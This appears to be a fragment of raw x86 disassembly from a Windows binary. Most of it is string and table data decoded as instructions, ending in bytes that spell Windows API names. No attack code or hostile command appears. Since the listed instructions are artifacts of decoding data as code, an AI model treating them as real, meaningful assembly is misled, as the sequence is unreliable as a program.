  4239ca:	xor    eax,DWORD PTR [eax]
  4239cc:	inc    ebp
  4239cd:	add    BYTE PTR [ecx+0x0],cl
  4239d0:	push   edx
  4239d1:	add    BYTE PTR [ecx],bh
  4239d3:	add    BYTE PTR [esi+0x0],dl
  4239d6:	add    BYTE PTR [eax],al
  4239d8:	dec    ebp
  4239d9:	add    BYTE PTR [edi],dh
  4239db:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239df:	add    BYTE PTR [edx+0x0],cl
  4239e2:	pop    eax
  4239e3:	add    BYTE PTR [ebx],dh
  4239e5:	add    BYTE PTR [ecx],dh
  4239e7:	add    BYTE PTR [ebx+0x0],al
  4239ea:	add    BYTE PTR [eax],al
  4239ec:	dec    edi
  4239ed:	add    BYTE PTR [esi],dh
  4239ef:	add    BYTE PTR [eax+0x0],cl
  4239f2:	pop    edi
  4239f3:	add    BYTE PTR [eax],dh
  4239f5:	add    BYTE PTR [edi],dh
  4239f7:	add    BYTE PTR [ecx],dh
  4239f9:	add    BYTE PTR [edx+0x0],dl
  4239fc:	xor    eax,0x55000000
  423a01:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423a05:	add    BYTE PTR [edi+0x0],bl
  423a08:	push   esp
  423a09:	add    BYTE PTR [ecx+0x0],al
  423a0c:	cmp    DWORD PTR [eax],eax
  423a0e:	pop    edi
  423a0f:	add    BYTE PTR [ebx],dh
  423a11:	add    BYTE PTR [eax],dh
  423a13:	add    BYTE PTR [eax],bh
  423a15:	add    BYTE PTR [edi+0x0],cl
  423a18:	inc    ebx
  423a19:	add    BYTE PTR ds:0x4d000000,dh
  423a1f:	add    BYTE PTR [esi+0x0],cl
  423a22:	inc    ebp
  423a23:	add    BYTE PTR [edi+0x0],bl
  423a26:	push   esp
  423a27:	add    BYTE PTR [esi+0x0],al
  423a2a:	cmp    BYTE PTR [eax],al
  423a2c:	push   ebx
  423a2d:	add    BYTE PTR [edx+0x0],bl
  423a30:	pop    edi
  423a31:	add    BYTE PTR [eax],dh
  423a33:	add    BYTE PTR [eax],bh
  423a35:	add    BYTE PTR [eax+0x0],cl
  423a38:	add    BYTE PTR [eax],al
  423a3a:	dec    esi
  423a3b:	add    BYTE PTR [edi+0x0],cl
  423a3e:	pop    edx
  423a3f:	add    BYTE PTR [edi+0x0],bl
  423a42:	add    BYTE PTR ss:[ecx+0x0],bl
  423a46:	dec    ebp
  423a47:	add    BYTE PTR [esi],dh
  423a49:	add    BYTE PTR [ebx],dh
  423a4b:	add    BYTE PTR [edi+0x0],bl
  423a4e:	xor    al,0x0
  423a50:	dec    esi
  423a51:	add    BYTE PTR [edx],dh
  423a53:	add    BYTE PTR [esi],dh
  423a55:	add    BYTE PTR [ecx],dh
  423a57:	add    BYTE PTR [eax],al
  423a59:	add    BYTE PTR [ebx+0x0],cl
  423a5c:	dec    eax
  423a5d:	add    BYTE PTR [eax],bh
  423a5f:	add    BYTE PTR [edi+0x0],bl
  423a62:	inc    esi
  423a63:	add    BYTE PTR [esi+0x0],al
  423a66:	push   esp
  423a67:	add    BYTE PTR [edi],dh
  423a69:	add    BYTE PTR [esi],dh
  423a6b:	add    BYTE PTR [edi+0x0],bl
  423a6e:	dec    esp
  423a6f:	add    BYTE PTR [ecx+0x0],bl
  423a72:	add    BYTE PTR [eax],al
  423a74:	push   ebx
  423a75:	add    BYTE PTR [ecx+0x0],bl
  423a78:	xor    BYTE PTR [eax],al
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [ecx],bh
  423a7d:	add    BYTE PTR [edx+0x0],dl
  423a80:	dec    eax
  423a81:	add    BYTE PTR [ecx+0x0],bl
  423a84:	xor    al,BYTE PTR [eax]
  423a86:	pop    edi
  423a87:	add    BYTE PTR [eax],dh
  423a89:	add    BYTE PTR [eax],al
  423a8b:	add    BYTE PTR [edx+0x0],al
  423a8e:	dec    edx
  423a8f:	add    BYTE PTR [esi+0x0],cl
  423a92:	xor    al,BYTE PTR [eax]
  423a94:	pop    edi
  423a95:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a99:	add    BYTE PTR [edx+0x0],dl
  423a9c:	xor    al,0x0
  423a9e:	dec    eax
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [ebp+0x0],dl
  423aa4:	add    BYTE PTR ss:[ebp+0x0],cl
  423aa8:	xor    DWORD PTR [eax],eax
  423aaa:	pop    edi
  423aab:	add    BYTE PTR [esi],dh
  423aad:	add    BYTE PTR [ecx+0x0],bl
  423ab0:	push   ebp
  423ab1:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423ab5:	add    BYTE PTR [edi+0x0],cl
  423ab8:	inc    esp
  423ab9:	add    BYTE PTR [edi+0x0],dl
  423abc:	push   ebx
  423abd:	add    BYTE PTR [eax],al
  423abf:	add    BYTE PTR [edx+0x0],bl
  423ac2:	inc    ebx
  423ac3:	add    BYTE PTR [ebp+0x0],dl
  423ac6:	pop    edi
  423ac7:	add    BYTE PTR [ecx],dh
  423ac9:	add    BYTE PTR [ebp+0x0],al
  423acc:	push   esp
  423acd:	add    BYTE PTR [eax],dh
  423acf:	add    BYTE PTR [eax],al
  423ad1:	add    BYTE PTR [eax],al
  423ad3:	add    BYTE PTR [eax],al
  423ad5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423adb:	inc    edx
  423adc:	add    BYTE PTR [eax],cl
  423ade:	add    BYTE PTR [edx+0x0],0xc
  423ae2:	add    BYTE PTR [edx+0x0],0x10
  423ae6:	add    BYTE PTR [edx+0x0],0x14
  423aea:	add    BYTE PTR [edx+0x0],0x18
  423aee:	add    BYTE PTR [edx+0x0],0x1c
  423af2:	add    BYTE PTR [edx+0x0],0x20
  423af6:	add    BYTE PTR [edx+0x0],0x24
  423afa:	add    BYTE PTR [edx+0x0],0x28
  423afe:	add    BYTE PTR [edx+0x0],0x0
	...
  423b12:	add    BYTE PTR [eax],al
  423b14:	sbb    edi,DWORD PTR [edi+0x4d57]
  423b1a:	add    BYTE PTR [eax],al
  423b1c:	inc    edx
  423b1d:	cmp    eax,DWORD PTR [edx]
  423b1f:	add    BYTE PTR [ecx],al
  423b21:	add    BYTE PTR [eax],al
  423b23:	add    BYTE PTR [ecx],al
  423b25:	add    BYTE PTR [eax],al
  423b27:	add    BYTE PTR [ecx],al
  423b29:	add    BYTE PTR [eax],al
  423b2b:	add    BYTE PTR [eax],bh
  423b2d:	cmp    eax,DWORD PTR [edx]
  423b2f:	add    BYTE PTR [ebx+edi*1],bh
  423b32:	add    al,BYTE PTR [eax]
  423b34:	inc    eax
  423b35:	cmp    eax,DWORD PTR [edx]
  423b37:	add    BYTE PTR [esi-0x31],al
  423b3a:	add    BYTE PTR [eax],al
  423b3c:	dec    esi
  423b3d:	cmp    eax,DWORD PTR [edx]
  423b3f:	add    BYTE PTR [eax],al
  423b41:	add    BYTE PTR [edi+0x6f],dl
  423b44:	jb     0x423baa
  423b46:	push   edi
  423b47:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b4e:	aas    
  423b4f:	inc    ebp
  423b50:	outs   dx,BYTE PTR ds:[esi]
  423b51:	jne    0x423bc0
  423b53:	push   edi
  423b54:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b5b:	popa   
  423b5c:	je     0x423bc7
  423b5e:	outs   dx,DWORD PTR ds:[esi]
  423b5f:	outs   dx,BYTE PTR ds:[esi]
  423b60:	jae    0x423bb5
  423b62:	je     0x423bc5
  423b64:	.byte 0x74
